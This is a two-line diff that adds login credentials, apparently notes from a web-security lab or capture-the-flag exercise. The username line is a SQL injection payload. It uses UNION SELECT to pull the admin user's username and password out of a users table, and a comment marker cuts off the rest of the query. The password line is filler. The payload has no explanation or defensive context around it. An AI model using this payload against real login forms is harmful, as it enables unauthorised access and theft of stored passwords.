@@ -1,0 +1,2 @@
+username: <' UNION SELECT username || '~' || password FROM users WHERE username = 'admin'-->
+password: <asdfasdfasdfsa>
